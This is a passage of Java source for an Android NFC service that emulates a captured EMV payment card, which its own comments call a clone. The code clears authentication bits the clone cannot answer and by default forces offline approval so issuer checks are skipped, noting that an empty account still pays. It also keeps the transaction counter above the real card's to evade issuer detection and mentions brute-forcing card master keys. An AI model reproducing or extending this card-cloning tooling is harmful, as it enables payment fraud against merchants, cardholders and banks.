package de.androidcrypto.android_hce_emulate_a_creditcard;

import android.content.SharedPreferences;
import android.nfc.cardemulation.HostApduService;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.util.Arrays;
import java.util.Calendar;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.TreeMap;
import java.util.TreeSet;

public class ShadowApduService extends HostApduService {

    private static final String TAG = "HCE";

    private static final byte[] SW_OK          = hex("9000");
    private static final byte[] SW_BAD         = hex("6A82");
    private static final byte[] SW_UNSUPPORTED = hex("6D00");
    private static final byte[] SW_MALFORMED   = hex("6700");
    private static final byte[] SW_NO_RECORD   = hex("6A83");
    private static final byte[] SW_NOT_FOUND   = hex("6A88");
    private static final byte[] SW_CONDITIONS  = hex("6985");
    private static final byte[] SW_ERR         = hex("6F00");
    private static final byte[] PPSE           = hex("325041592E5359532E4444463031");

    private static final String DEFAULT_AIP = "1880";
    private static final String DEFAULT_AID = "A0000000031010";

    /**
     * Keeps RFU 0x80, CV 0x10, TRM 0x08. Clears SDA 0x40, DDA 0x20, issuer
     * auth 0x04, on-device CVM 0x02 and CDA 0x01 - none of the five is
     * answerable by a clone with no certificates, and an AIP that claims them
     * buys a failed ODA attempt and a TVR bit instead of a clean start.
     *
     * The old value was 0xD9 = 0x80|0x40|0x10|0x08|0x01, which kept exactly
     * SDA and CDA - the two a clone provably cannot perform - and cleared only
     * DDA.
     */
    private static final byte AIP_KEEP_MASK = (byte) 0x98;

    /**
     * MSD AIP mask, MASTERCARD PATH ONLY.
     *
     * Byte 1 keeps 0x10 CV, 0x08 TRM and 0x80 (RFU under both Visa and
     * ExpressPay, kept so nothing surprises a picky kernel). Clears SDA 0x40,
     * DDA 0x20, CDA 0x01 and issuer auth 0x04 - none is answerable in a
     * mag-stripe flow, and issuer auth is an online capability with no ARPC
     * to follow it.
     *
     * Byte 2 keeps everything but 0x80. Under Mastercard 0x80 means EMV mode,
     * so MSD is selected by clearing it - the opposite of Visa, where 0x80 IS
     * the MSD bit. That asymmetry is why a profile with an msdAip() override
     * never reaches this mask at all.
     */
    private static final byte AIP_MSD_KEEP_1 = (byte) 0x98;
    private static final byte AIP_MSD_KEEP_2 = (byte) 0x7F;

    /** Track 2 CSC tag in the CCC response. 9F60 is the Track 1 twin. */
    private static final int TAG_CVC3_T2 = 0x9F61;
    private static final int TAG_CVC3_T1 = 0x9F60;
    private static final int TAG_UN_MSD   = 0x9F6A;
    private static final int TAG_UDOL     = 0x9F69;

    /**
     * Default IAD when the card has none.
     *
     * Byte 1 is the DKI, byte 2 is the CVN. 0x10 is CVN 16 - Mastercard
     * Proprietary SKD - which is what the reference card declares and what
     * cvn() reads to pick the session-key scheme.
     *
     * Only reached when the profile's own defaultIad() returns null. Amex
     * returns an empty string instead, because it has no CVN block.
     */
    private static final String DEFAULT_IAD = "06010A03A00000";

    private static final boolean STRIP_AC = false;

    private static final boolean EXTRA_AIDS = false;

    /**
     * False: the generated directory carries a label and a 9F2A kernel id.
     *
     * True emitted 4F and 87 only, which leaves a terminal inferring the kernel
     * from the AID prefix. Amex needs 9F2A 04 to be picked by identifier at all,
     * and the two bytes cost nothing under Mastercard and Visa.
     *
     * This is the no-script path only. With a script armed the profile's own
     * selectPpse() answers the directory, which is why the profiles carry 9F2A
     * themselves.
     */
    private static final boolean PPSE_MINIMAL = false;

    private static final byte CID_AAC  = Emv.CID_AAC;
    private static final byte CID_TC   = Emv.CID_TC;
    private static final byte CID_ARQC = Emv.CID_ARQC;

    /**
     * The GPO CID is no longer a constant - see gpoCidFor(). It follows the key
     * and the force-TC pref, because a keyless card cannot answer an ARQC and a
     * keyed one that answers TC never reaches genac().
     */

    private static final boolean ALWAYS_ONLINE_FOR_RECEIPT = false;

    /**
     * GENERATE AC only, so unreachable in MSD - that flow is a single CCC
     * exchange and never sends GENERATE AC. Kept for the EMV path.
     *
     * FORCE_OFFLINE_TC is the one flag of the two that is a PREF, see
     * forceOfflineTc(). It changes what the card tells a terminal, and whether
     * an offline approve is wanted depends on the shop, not on the build.
     */
    private static final boolean FORCE_ONLINE_ARQC = false;

    /**
     * FALLBACKS. All four of these are now overridable from the card's boxes -
     * see dol() and hexBox() - and the constant is what gets served when the box
     * is empty or malformed.
     *
     * They used to be the only source, so the PDOL / CDOL1 / CDOL2 / CVM list
     * fields in the editor were written to prefs on every keystroke and read by
     * nothing. Typing into them changed the preview and not the card.
     */
    private static final String PDOL    = "9F02069F03069F1A0295055F2A029A039C019F3704";
    private static final String CDOL1   = "9F02069F03069F1A0295055F2A029A039C019F3704";
    private static final String CDOL2   = "9F02069F03069F1A0295055F2A029A039C019F37049F3403";

    /**
     * The MSD checksum descriptor, 9F37 alone, four bytes.
     *
     * The CSC needs the UN and nothing else, and a four-byte descriptor keeps
     * the CCC field at four bytes - which is what udolLen() returns with no
     * 9F69 and what unOffset() assumes. A longer descriptor would put the UN
     * behind other fields.
     *
     * Without an 8C in the FCI the terminal has no descriptor for COMPUTE
     * CRYPTOGRAPHIC CHECKSUM and quits after the record.
     *
     * EMV DOES NOT USE THIS. select() advertises the CDOL1 box (or CDOL1) on the
     * EMV path, because an ARQC MACed over the UN alone covers no amount, no
     * currency and no terminal country - the issuer rebuilds a longer input and
     * no key can make that match.
     */
    private static final String CDOL_MSD = "9F3704";

    /**
     * CVM list. Eight bytes of zero Amount X and Amount Y, then two rules:
     * 1F 03 no CVM below the limit, 1E 03 signature above it. Signature cannot
     * fail, so the fallback sets no TVR bit. Ten bytes - the two amount fields
     * are mandatory.
     */
    private static final String CVMLIST = "00000000000000001F031E03";

    /** Documentation only - the terminal owns 9F34 and sends it in CDOL1. */
    private static final String CVM_RESULTS = "1F0302";

    private final StringBuilder tapLog = new StringBuilder();
    private final SecureRandom rnd = new SecureRandom();

    /**
     * Main-looper handler, one instance.
     *
     * Everything posted to the UI - toasts, the stall watcher, the MSD sanity
     * pass - goes through this, so removeCallbacksAndMessages(null) can clear
     * them all in one place when a tap ends.
     */
    private final android.os.Handler ui =
            new android.os.Handler(android.os.Looper.getMainLooper());

    /**
     * Tap generation counter.
     *
     * The stall watcher runs 1.5s after the GPO, on the main looper, and reads
     * counters that the binder thread owns. Without a token to compare against,
     * a watcher armed for tap A fires during tap B and reports B's counters as
     * if they were A's - or fires after onDeactivated() reset them all to zero
     * and reports "the terminal read no records" for a tap that is over.
     *
     * Bumped by resetTransaction(), which runs both at the start of a tap and at
     * deactivation, so any watcher armed before either point is stale by
     * definition and drops out.
     */
    private int txnEpoch;

    /**
     * Whether a tap is in progress.
     *
     * THE RESET USED TO HANG OFF THE PPSE SELECT ALONE, and a terminal that
     * knows the AID does not always ask for the directory first - some wallets
     * go straight to SELECT AID. That tap then ran on the previous tap's
     * counters, its slot prefix and its log: nSelects was already 1 before the
     * first APDU, slotPrefix pointed at whatever card was tapped last, and
     * verdict() described a tap that had already finished.
     *
     * So the reset moved to the FIRST APDU of a tap, whatever its class. The
     * PPSE block keeps only its own bookkeeping.
     *
     * Set at the top of processCommandApdu, cleared in onDeactivated.
     */
    private boolean tapOpen;

    private byte[] txnAip;
    private String txnAtc;
    /** ATC staged for this tap, not yet written. Committed at cryptogram emission. */
    private String pendingAtc;
    /** Hex, cached with txnAtc so the two can never disagree. */
    private String txnAc;

    /**
     * The 83 data of this tap's GPO command, or null.
     *
     * The AC has to be MACed over the SAME PDOL data the terminal sent, or the
     * issuer reconstructs a different input. The script path never looked at it
     * at all - it MACed over an empty field - so every scripted GPO carried a
     * cryptogram over no amount, no currency and no terminal country. Held for
     * the tap so txnAcHex() and the recompute below agree.
     */
    private byte[] txnPdol;

    private boolean cryptogramSent;
    private int scriptHits;

    private byte[] capturedIad;
    private String gpoCid = "";

    /** True once a checksum has consumed this tap's ATC, so a second one climbs. */
    private boolean atcUsedByCcc;

    /**
     * EMV transaction state, driven by what the service actually answered.
     *
     * txnAfl is null until a GPO succeeds, and a null AFL means "no GPO yet":
     * READ RECORD then keeps its old behaviour. Once a GPO has answered, only
     * the records that AFL names are readable.
     *
     * Cleared by a new application SELECT (see startApplication), so a second
     * tap or a second AID begins clean, and by resetTransaction().
     */
    private byte[] txnAid;
    private boolean gpoOk;
    private byte[] txnAfl;
    private int curSfi, curRec;
    private int recsSinceSelect;

    private boolean sawPpse;
    private int nSelects, nGpos, nRecs, nGens, nCccs;
    private String lastCid = "";

    private boolean sawError;
    /** Warn-once guards: these fields are read several times per tap. */
    private boolean psnWarned;
    private boolean expiryWarned;

    /** Pref keys already warned about this tap, so a repeated read says it once. */
    private Set<String> warned;

    /**
     * The key set for this tap, or null until something needs it.
     *
     * afl() needs the key names to derive the record ranges, and getAll() is the
     * only way to get them - which on an encrypted store means decrypting the
     * whole file. It used to run up to three times per tap, on the binder
     * thread, once per READ RECORD through msdLocation().
     *
     * Cleared in resetTransaction(), so it is fresh for every tap and cannot go
     * stale behind a capture made in between.
     */
    private Set<String> keyCache;

    /**
     * The slot prefix for this tap, or null until first needed.
     *
     * CACHED, and built without going through p(). See sel().
     *
     * Cleared in resetTransaction() so a tap that follows a wallet swipe picks
     * up the new slot, and so the value can never outlive the tap it belongs to.
     */
    private String slotPrefix;

    /**
     * Install the file crash logger and OPEN THE STORE HERE - but on a worker.
     *
     * CrashLog first: onCreate is the only place in this class guaranteed to run
     * before the first APDU, so the handler cannot miss a tap crash.
     *
     * THE STORE OPEN IS OFF THE MAIN THREAD. It used to be inline, which is
     * correct for ordering and wrong for latency: EncryptedSharedPreferences
     * .create() is a Keystore round trip, and the migration that may follow
     * re-encrypts the whole wallet. onCreate runs on the main thread, so a cold
     * tap paid all of it before the first APDU was answered - with the UI frozen
     * and a terminal counting down.
     *
     * prefs() still calls Prefs.get() and still blocks if the store is not open,
     * but it now blocks a binder thread that has one APDU to answer rather than
     * the main thread that has to draw. On a warm app the call is cached and this
     * thread is a no-op.
     */
    @Override
    public void onCreate() {
        super.onCreate();
        CrashLog.install(this);

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Prefs.get(ShadowApduService.this);
                } catch (Throwable t) {
                    Log.w(TAG, "store open at service start failed", t);
                }
            }
        }, "store-open").start();
    }

    /**
     * Buffered, per slot. TapLog holds the lines and writes them once when the
     * tap ends - the old version opened a file per APDU, on the binder thread.
     *
     * Guarded. This runs on the binder thread inside the APDU path, and it is
     * reached from tap(), which is itself the error handler - a throw in here
     * would escape processCommandApdu and kill the process on the tap that was
     * already going wrong.
     */
    private void termLog(String s) {
        try {
            TapLog.append(this, sel(), s);
        } catch (Throwable ignored) { }
    }

    /**
     * Guarded, both halves. THE FIRST HALF CANNOT THROW PAST THIS METHOD.
     *
     * tap() is called from the catch block of processCommandApdu, so anything
     * that escapes here goes out of processCommandApdu - which HostApduService
     * does not wrap - and takes the process down. That is exactly "the app
     * closed when I tapped". Nothing in a log line is worth a crash.
     *
     * SYNCHRONISED ON THE BUILDER. Two threads write here now: the binder thread
     * on every APDU, and the main looper for the stall watcher and the posted
     * MSD sanity pass. StringBuilder is not safe under that and used to lose or
     * duplicate lines.
     */
    private void tap(String s) {
        try {
            synchronized (tapLog) {
                tapLog.append(s).append('\n');
                if (tapLog.length() > 32000) tapLog.delete(0, 16000);
            }
        } catch (Throwable ignored) { }
        try {
            termLog(s);
        } catch (Throwable ignored) { }
    }

    private void clearLog() {
        try {
            synchronized (tapLog) {
                tapLog.setLength(0);
            }
        } catch (Throwable ignored) { }
    }

    private String logText() {
        try {
            synchronized (tapLog) {
                return tapLog.toString();
            }
        } catch (Throwable t) {
            return "";
        }
    }

    /** tap(), but only the first time this key complains in a tap. */
    private void warnOnce(String key, String line) {
        try {
            if (warned == null) warned = new HashSet<>();
            if (warned.add(key)) tap(line);
        } catch (Throwable ignored) { }
    }

    private void popup(final String s) {
        if (s == null || s.isEmpty()) return;
        try {
            ui.post(new Runnable() {
                @Override
                public void run() {
                    try {
                        Toast.makeText(ShadowApduService.this, s, Toast.LENGTH_SHORT).show();
                    } catch (Throwable ignored) { }
                }
            });
        } catch (Throwable ignored) { }
    }

    static byte[] hex(String s) { return Hex.hex(s); }
    static byte[] cat(byte[]... arrs) { return Tlv.cat(arrs); }
    private static String bytesToHex(byte[] d) { return Hex.toHex(d); }

    static byte[] tlv(int tag, byte[] v) {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        if ((tag & 0xFF00) != 0) {
            o.write((tag >> 8) & 0xFF);
            o.write(tag & 0xFF);
        } else {
            o.write(tag & 0xFF);
        }
        int n = v.length;
        if (n < 0x80) {
            o.write(n);
        } else if (n <= 0xFF) {
            o.write(0x81);
            o.write(n);
        } else if (n <= 0xFFFF) {
            o.write(0x82);
            o.write((n >> 8) & 0xFF);
            o.write(n & 0xFF);
        } else {
            o.write(0x83);
            o.write((n >> 16) & 0xFF);
            o.write((n >> 8) & 0xFF);
            o.write(n & 0xFF);
        }
        o.write(v, 0, n);
        return o.toByteArray();
    }

    private static int readTag(byte[] b, int[] pos) {
        if (pos[0] >= b.length) return 0;
        int t = b[pos[0]++] & 0xFF;
        if ((t & 0x1F) == 0x1F) {
            if (pos[0] >= b.length) return t;
            t = (t << 8) | (b[pos[0]++] & 0xFF);
            while (pos[0] < b.length && (b[pos[0] - 1] & 0x80) != 0) {
                t = (t << 8) | (b[pos[0]++] & 0xFF);
            }
        }
        return t;
    }

    private static int readLen(byte[] b, int[] pos) {
        if (pos[0] >= b.length) return 0;
        int l = b[pos[0]++] & 0xFF;
        if ((l & 0x80) != 0) {
            int n = l & 0x7F, v = 0;
            for (int k = 0; k < n && pos[0] < b.length; k++) {
                v = (v << 8) | (b[pos[0]++] & 0xFF);
            }
            return v;
        }
        return l;
    }

    private static int lcOf(byte[] apdu) {
        if (apdu.length < 5) return 0;
        int lc = apdu[4] & 0xFF;
        if (lc != 0x00) return lc;
        if (apdu.length < 7) return 0;
        return ((apdu[5] & 0xFF) << 8) | (apdu[6] & 0xFF);
    }

    private static int dataOff(byte[] apdu) {
        return (apdu.length >= 7 && (apdu[4] & 0xFF) == 0x00) ? 7 : 5;
    }

    private static byte[] hexOrNull(String s) {
        return (s == null || s.isEmpty()) ? null : hex(s);
    }

    /**
     * The command data field verbatim, or empty.
     *
     * Used for the CDOL data of GENERATE AC. Bounded by lc and re-checked
     * against the real array length, because a short APDU with a long lc is
     * something terminals do emit and Arrays.copyOfRange would throw on it.
     */
    private static byte[] dataOf(byte[] apdu) {
        int lc = lcOf(apdu);
        int off = dataOff(apdu);
        if (lc <= 0 || apdu.length < off + lc) return new byte[0];
        return Arrays.copyOfRange(apdu, off, off + lc);
    }

    /**
     * The 83 template's data from a GPO command, or empty.
     *
     * The PDOL data sits inside an 83 wrapper. Anything that is not 83, or that
     * overruns the field, gives empty rather than a guess - an AC over the wrong
     * bytes is a decline with no local symptom.
     */
    private static byte[] pdolDataOf(byte[] apdu) {
        byte[] d = dataOf(apdu);
        if (d.length < 2) return new byte[0];
        int[] q = new int[]{0};
        int t = readTag(d, q);
        int l = readLen(d, q);
        if (t == 0x83 && q[0] + l <= d.length) {
            return Arrays.copyOfRange(d, q[0], q[0] + l);
        }
        return new byte[0];
    }

    /**
     * The store, through the one factory.
     *
     * Prefs.get() hands back the encrypted file, or the plaintext mirror when
     * the Keystore is unavailable. It caches, so the Keystore is not touched
     * per call - and onCreate has already started opening it on a worker.
     */
    private SharedPreferences prefs() {
        return Prefs.get(this);
    }

    /** The tap's key set, fetched once. See keyCache. */
    private Set<String> keys() {
        if (keyCache == null) keyCache = prefs().getAll().keySet();
        return keyCache;
    }

    /**
     * The slot prefix, cached for the tap. See slotPrefix.
     *
     * THE RECURSION THAT USED TO BE HERE. sel() built its answer with
     * p("selected", "0"), and p() builds its key as sel() + k - so every call
     * ran sel() -> p() -> sel() -> ... with no memoization and no re-entry
     * flag. The only terminator was a StackOverflowError, caught by the
     * catch (Throwable) in the innermost frame, so the whole thing collapsed to
     * "card0_" and the real 'selected' pref was never read: p() was looking up
     * "card0_selected", which MainActivity never writes.
     *
     * The symptom was invisible on a one-card wallet and total beyond it: every
     * tap served slot 0 whatever was on screen, and every ATC commit and tap log
     * from a card 2 tap landed in card 0's slot. It also paid a full stack
     * overflow and unwind - tens of thousands of frames - for every single pref
     * access, dozens of times per APDU, on the binder thread.
     *
     * The fix is that the read below is RAW: it goes to the pref directly, not
     * through p(), so the key it builds cannot depend on itself. The result is
     * then cached for the tap.
     *
     * Guarded anyway. 'selected' may be an int from an older build or the
     * plaintext mirror, and a bare getString throws a ClassCastException on
     * that. card0_ is the honest fallback: slot 0 is what bindCard() clamps to
     * and what every default in this class already assumes.
     */
    private String sel() {
        String s = slotPrefix;
        if (s != null) return s;

        String raw = null;
        try {
            raw = prefs().getString("selected", null);
        } catch (ClassCastException storedAsInt) {
            try {
                raw = String.valueOf(prefs().getInt("selected", 0));
            } catch (Throwable ignored) {
                raw = null;
            }
        } catch (Throwable ignored) {
            raw = null;
        }

        if (raw == null || raw.trim().isEmpty()) raw = "0";

        s = "card" + raw.trim() + "_";
        slotPrefix = s;
        return s;
    }

    /**
     * A pref value, or the default.
     *
     * getString, not getAll().get(). getAll() decrypts every value in the file
     * to build a map, and this is called dozens of times per tap - which was
     * free on a plaintext store and is not on an encrypted one. It only works
     * now because every key read here is stored as a string.
     *
     * "ONLY WORKS" IS THE POINT. A key written by an older build, or by the
     * plaintext mirror, may be an int or a boolean, and getString throws a
     * ClassCastException on those. MainActivity.intPref() and
     * CaptureActivity.getInt() have carried a CCE fallback for that; the service
     * did not, so the same value was survivable in the UI and fatal here.
     *
     * The fallback reads the single key out of getAll() and stringifies it, and
     * it only runs on the throw, so the cost stays where it belongs. Any other
     * failure returns the default rather than propagating - a pref read is never
     * worth an APDU.
     *
     * sel() is safe to call here now: it is cached and does not come back
     * through this method.
     */
    private String p(String k, String d) {
        String key = sel() + k;
        try {
            String v = prefs().getString(key, null);
            return (v == null || v.isEmpty()) ? d : v;
        } catch (ClassCastException e) {
            try {
                Object o = prefs().getAll().get(key);
                return o == null ? d : String.valueOf(o);
            } catch (Throwable t) {
                return d;
            }
        } catch (Throwable t) {
            return d;
        }
    }

    private void put(String k, String v) {
        prefs().edit().putString(sel() + k, v).apply();
    }

    /**
     * A hex pref, cleaned, or the fallback.
     *
     * ODD LENGTH FALLS BACK, it does not pad. Every one of these goes through
     * Hex.hex() or into a TLV, and a dropped nibble is a shifted field - the
     * kind of thing that reads as a terminal fault rather than a typo.
     *
     * Hex.hex() is STRICT about the charset too, so the strip below is what
     * makes a box holding "0x18 80" safe: Hex would reject the 'x'. The strip
     * runs first, the even-length test runs second, and both end at the
     * fallback rather than an exception.
     */
    private String hexBox(String key, String fallback) {
        String v = p(key, "").replaceAll("[^0-9A-Fa-f]", "");
        if (v.isEmpty()) return fallback;
        if ((v.length() & 1) != 0) {
            warnOnce(key, "!! " + key + " box is odd-length hex - using the constant");
            return fallback;
        }
        return v.toUpperCase();
    }

    /**
     * A DOL from the card's box, or the constant.
     *
     * VALIDATED, not merely read. A DOL is a TLV list the terminal walks field
     * by field: one bad byte and it either sends a GPO the card cannot parse or
     * gives up on the app. TlvValidator is the same walk the profile self-check
     * runs from the menu, so anything that passes there passes here.
     */
    private String dol(String key, String fallback) {
        String v = hexBox(key, fallback);
        if (v.equals(fallback)) return fallback;

        String problem = TlvValidator.firstProblem(v);
        if (problem != null) {
            warnOnce(key, "!! " + key + " box malformed (" + problem + ") - using the constant");
            return fallback;
        }
        return v;
    }

    /**
     * A CVM list from the box, or the constant.
     *
     * A CVM list is NOT a DOL and TlvValidator cannot check it: it is eight
     * bytes of two amounts followed by 2-byte rules, no tags anywhere. A
     * structurally wrong one is worse than an odd nibble - a list that is short
     * enough has no rule at all, so the terminal applies no CVM and the tap ends
     * in an approval with an unverified cardholder.
     *
     * So the shape is checked here: at least the two amounts plus one rule, and
     * a rule tail that divides by two.
     */
    private String cvmBox() {
        String v = hexBox("cvmlist", CVMLIST);
        if (v.equals(CVMLIST)) return CVMLIST;

        if (v.length() < 20 || ((v.length() - 16) & 3) != 0) {
            warnOnce("cvmlist", "!! cvmlist box is " + v.length()
                    + " hex - needs 16 for the amounts plus 4 per rule, using the constant");
            return CVMLIST;
        }
        return v;
    }

    /**
     * The AID from the capture, or empty.
     *
     * Same cleaning as the aid box and the same reason: this is fed straight to
     * Hex.hex() and into a 4F, and a stray character is a 6F00 on SELECT AID -
     * the second APDU of every tap, before anything useful has been logged.
     * Anything shorter than a five-byte AID is not an AID.
     */
    private String capAid() {
        String s = p("cap_aid", "").replaceAll("[^0-9A-Fa-f]", "").toUpperCase();
        if (s.length() < 10 || (s.length() & 1) != 0) return "";
        return s;
    }

    /**
     * Whether this tap runs mag-stripe mode.
     *
     * The pref ORs with the profile: Amex is mag-stripe by nature, so a true
     * there cannot be turned off from the box. Mastercard and Visa return
     * false and stay governed by the pref alone.
     */
    private boolean isMsd() {
        String v = p("msd", "0").trim();
        if (v.equals("1") || v.equalsIgnoreCase("true") || v.equalsIgnoreCase("on")) return true;
        return activeProfile().msd();
    }

    /**
     * Whether an offline TC is forced. DEFAULT TRUE, and a deliberate deviation
     * from what the card would really answer.
     *
     * A card with no IMK-AC cannot produce a real ARQC - computeAc emits eight
     * zero bytes - so going online hands the issuer a cryptogram that verifies
     * against nothing. Forcing TC keeps the tap offline and the terminal
     * approves on its own TAC without ever consulting the issuer. The cost is
     * that nothing is authorised against a real balance, so an empty account
     * still taps through.
     *
     * A pref rather than a constant because that trade is a choice per shop,
     * not per build. "0" is the only value that turns it off, so any other
     * string - including an empty one - leaves the safe default.
     *
     * Read by gpoCidFor() for the GPO and by Emv.decideCid for GENERATE AC, so
     * a requested AAC above it still wins in both.
     */
    private boolean forceOfflineTc() {
        String v = p("forcetc", "1").trim();
        if (v.isEmpty()) return true;
        if (v.equalsIgnoreCase("true") || v.equalsIgnoreCase("on")) return true;
        if (v.equalsIgnoreCase("false") || v.equalsIgnoreCase("off")) return false;
        return !v.equals("0");
    }

    // ---------- card fields ----------

    private String pan() {
        String s = p("pan", "4111111111111111").replaceAll("[^0-9]", "");
        return s.isEmpty() ? "4111111111111111" : s;
    }

    /**
     * PAN sequence number, two digits.
     *
     * PSN is concatenated with the PAN and the rightmost sixteen nibbles of that
     * pair become the ICC master key input. A truncated or padded PSN therefore
     * derives a completely different key, and the only symptom is a wrong ARQC -
     * which reads as a wrong master key and sends you off brute-forcing a key
     * that was correct all along.
     *
     * THE DEFAULT IS 01, not 00. MainActivity has no PSN box, so a hand-built
     * card has no value here at all, and 01 is the PSN on a first card. It used
     * to default to 00 while the key scan defaulted to 01 - two different ICC
     * keys from the same correct IMK-AC, and the scan blamed the key. bindCard()
     * now seeds the pref so this default is only a floor.
     */
    private String psn() {
        String raw = p("psn", "01").replaceAll("[^0-9]", "");

        if (raw.isEmpty()) {
            if (!psnWarned) tap("!! psn is empty - using 01");
            psnWarned = true;
            return "01";
        }
        if (raw.length() == 1) {
            if (!psnWarned) tap("!! psn \"" + raw + "\" is one digit - padding to 0" + raw);
            psnWarned = true;
            return "0" + raw;
        }
        if (raw.length() > 2) {
            String cut = raw.substring(0, 2);
            if (!psnWarned) tap("!! psn \"" + raw + "\" is " + raw.length()
                    + " digits - truncating to " + cut);
            psnWarned = true;
            return cut;
        }
        return raw;
    }

    /**
     * Label for the directory and the FCI, at most 16 characters.
     *
     * Non-printable and non-ASCII are stripped, not substituted: the label is
     * written with US_ASCII, so an accent would otherwise land as '?' and a
     * stray newline would land as a control byte inside a 50.
     */
    private String labelText() {
        String s = p("label", p("cap_label", "CARD")).replaceAll("[^\\x20-\\x7E]", "").trim();
        if (s.isEmpty()) s = "CARD";
        return s.length() > 16 ? s.substring(0, 16) : s;
    }

    /**
     * Highest ATC ever seen from the plastic. Our counter never drops below it.
     *
     * A clone that starts at 001B and counts up regresses against any card that
     * has been used, and the issuer's ATC-window check declines a regression no
     * matter how good the cryptogram is. This is the floor that stops it.
     */
    private int atcFloor() {
        String f = p("atcfloor", "").replaceAll("[^0-9A-Fa-f]", "");
        if (f.length() != 4) return 0;
        try { return Integer.parseInt(f, 16); } catch (NumberFormatException e) { return 0; }
    }

    private String nextAtc() {
        int cur = 0x001B;
        try {
            String c = p("atc", "001B").replaceAll("[^0-9A-Fa-f]", "");
            if (c.length() == 4) cur = Integer.parseInt(c, 16);
        } catch (Exception ignored) { }
        int next = Math.max(cur + 1, atcFloor() + 1);
        pendingAtc = String.format("%04X", next & 0xFFFF);
        return pendingAtc;
    }

    /**
     * Raise the ATC floor from the current capture, if it carries one.
     *
     * Runs on every PPSE and only ever raises, so re-reading the plastic after
     * using it keeps the floor current without a sync button to forget about.
     * A commit() only happens when the value actually moves.
     *
     * The GENERATE AC capture is the last resort: 9F36 only ever appears there
     * on a card whose GPO and record both omit it, which is what the bundled
     * reader app stages.
     */
    private void seedAtcFromCapture() {
        byte[] atc = null;
        byte[] g = rawGpo();
        if (g != null) atc = findTag(g, 0x9F36);
        if (atc == null) {
            byte[] r = rawRec(1, 1);
            if (r != null) atc = findTag(r, 0x9F36);
        }
        if (atc == null) {
            byte[] ga = cap("rawgenac");
            if (ga != null) atc = findTag(ga, 0x9F36);
        }
        if (atc == null || atc.length != 2) return;

        int seen = ((atc[0] & 0xFF) << 8) | (atc[1] & 0xFF);
        if (seen > atcFloor()) {
            putNow("atcfloor", bytesToHex(atc));
            tap("-- atc floor raised to " + bytesToHex(atc) + " from the capture");
        }
    }

    /** Name a stale counter at tap time, because it is otherwise silent. */
    private void warnIfAtcStale() {
        int floor = atcFloor();
        if (floor == 0) return;
        int cur;
        try {
            cur = Integer.parseInt(p("atc", "0").replaceAll("[^0-9A-Fa-f]", ""), 16);
        } catch (Exception e) { return; }
        if (cur + 0x10 < floor) {
            tap("!! atc " + String.format("%04X", cur) + " trails the card's "
                    + String.format("%04X", floor) + " by more than 0x10");
        }
    }

    private String txnAtc() {
        if (txnAtc == null) txnAtc = nextAtc();
        return txnAtc;
    }

    /** Write the staged ATC synchronously, at cryptogram emission and only there. */
    private void commitAtc() {
        if (pendingAtc == null) return;
        putNow("atc", pendingAtc);
        putNow("atccommitted", pendingAtc);
    }

    private void putNow(String k, String v) {
        prefs().edit().putString(sel() + k, v).commit();
    }

    /**
     * The AC that goes in a scripted GPO, or zeros without a key.
     *
     * OVER THE TAP'S PDOL DATA, not over an empty field. This used to MAC
     * new byte[0], so every scripted GPO carried a cryptogram covering no
     * amount, no currency and no terminal country - structurally valid and
     * unverifiable by any issuer. The PDOL data is captured into txnPdol before
     * the script is evaluated, and the recompute in processCommandApdu uses the
     * same value, so the cached hex and the served bytes agree.
     */
    private String txnAcHex() {
        if (txnAc == null) {
            txnAc = haveKey()
                    ? bytesToHex(computeAc(txnAtc(), txnPdol == null ? new byte[0] : txnPdol))
                    : "0000000000000000";
        }
        return txnAc;
    }

    /**
     * Clear the tap.
     *
     * Also the epoch bump: any stall watcher armed before this call is now
     * stale, and clearCallbacks drops the ones still queued. Both halves are
     * needed - the clear handles the queued runnable, the epoch handles one that
     * has already been dequeued and is mid-run on the main thread.
     *
     * slotPrefix goes with the rest: the next tap may be a different card, and
     * a stale prefix would serve the previous one's slot.
     */
    private void resetTransaction() {
        try {
            ui.removeCallbacksAndMessages(null);
        } catch (Throwable ignored) { }
        txnEpoch++;

        txnAip = null;
        txnAtc = null;
        pendingAtc = null;
        txnAc = null;
        txnPdol = null;
        cryptogramSent = false;
        scriptHits = 0;
        atcUsedByCcc = false;
        sawPpse = false;
        clearApplicationState();
        nSelects = nGpos = nRecs = nGens = nCccs = 0;
        lastCid = "";
        sawError = false;
        psnWarned = false;
        expiryWarned = false;
        warned = null;
        capturedIad = null;
        gpoCid = "";
        keyCache = null;
        slotPrefix = null;
    }

    private void clearApplicationState() {
        txnAid = null;
        gpoOk = false;
        txnAfl = null;
        curSfi = curRec = 0;
        recsSinceSelect = 0;
    }

    /** True when the AFL names this SFI and record. Each entry is 4 bytes. */
    private static boolean aflContains(byte[] afl, int sfi, int rec) {
        for (int i = 0; i + 4 <= afl.length; i += 4) {
            if (((afl[i] & 0xFF) >> 3) == sfi
                    && rec >= (afl[i + 1] & 0xFF) && rec <= (afl[i + 2] & 0xFF)) {
                return true;
            }
        }
        return false;
    }

    /** The AFL out of a GPO response without its status word, or empty. */
    private static byte[] aflOfGpo(byte[] body) {
        if (body == null || body.length < 4) return new byte[0];
        int[] pos = new int[1];
        int outer = readTag(body, pos);
        byte[] afl;
        if (outer == 0x80) {
            int l = readLen(body, pos);
            int end = Math.min(body.length, pos[0] + l);
            afl = (pos[0] + 2 <= end) ? Arrays.copyOfRange(body, pos[0] + 2, end) : null;
        } else {
            afl = findTag(body, 0x94);
        }
        return afl == null ? new byte[0] : afl;
    }

    /**
     * Follow the EMV sequence from what was actually answered, on both the
     * script path and the generated path. Only a 9000 moves the state.
     */
    private void trackState(byte[] apdu, int ins, byte[] out) {
        if (out == null || out.length < 2
                || (out[out.length - 2] & 0xFF) != 0x90 || out[out.length - 1] != 0x00) {
            return;
        }
        byte[] body = Arrays.copyOf(out, out.length - 2);

        if (ins == 0xA4) {
            int lc = lcOf(apdu), off = dataOff(apdu);
            if (apdu.length < off + lc) return;
            byte[] name = Arrays.copyOfRange(apdu, off, off + lc);
            if (Arrays.equals(name, PPSE)) return;
            clearApplicationState();
            txnAid = name;
        } else if (ins == 0xA8) {
            gpoOk = true;
            txnAfl = aflOfGpo(body);
            curSfi = curRec = 0;
        } else if (ins == 0xB2) {
            recsSinceSelect++;
            curSfi = (apdu[3] & 0xFF) >> 3;
            curRec = apdu[2] & 0xFF;
        }
    }

    private byte[] aipForMac() {
